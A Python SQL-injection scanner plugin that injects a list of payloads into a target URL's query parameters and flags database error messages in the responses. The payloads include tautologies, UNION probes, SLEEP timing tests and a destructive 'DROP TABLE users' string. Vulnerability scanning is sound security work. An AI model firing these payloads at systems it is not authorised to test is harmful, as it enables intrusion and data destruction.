import json
import re
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

SERVICE = "http"
DESCRIPTION = "Taken from TFS(https://github.com/PrathyayPGM-ALT/TFS) with permission. Checks for SQL Injection vulnerabilities in HTTP query parameters."
SCRIPT_NAME = "http-tfs-sqli"
OPTIONAL = True

SQLI_PAYLOADS = [
    "'",
    "'"''"'",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(5)--",
    "' AND SLEEP(5)--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 100--",
    "' OR EXISTS(SELECT * FROM users WHERE 1=1)--",
    "'; DROP TABLE users--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    "1' AND '1'='1",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
]

ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"sqlite_array_query",
    r"ORA-\d{5}",
    r"microsoft ole db provider",
    r"odbc sql server driver",
    r"syntax error.*sql",
    r"mysql_fetch",
    r"supplied argument is not a valid mysql",
]


def run(target, port, args=None):
    if not REQUESTS_OK:
        print("[!] requests not installed  ->  pip install requests")
        return

    args = args or {}
    url = args.get("url") or f"http://{target}:{port}"
    output = args.get("output")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print("[!] No query parameters found")
        return

    session = requests.Session()
    findings = []

    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                resp = session.get(test_url, allow_redirects=False)
                for pattern in ERROR_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        print(f"[!] SQLi error-based param={param} payload={payload[:50]}")
                        print(f"[*] Pattern: {pattern}")
                        print(f"[*] URL: {test_url[:90]}")
                        findings.append({
                            "type": "SQLi",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "evidence": pattern,
                            "url": test_url,
                        })
                        break
            except Exception:
                pass

    print(f"[*] Findings: {len(findings)}")

    if output:
        with open(output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Saved -> {output}")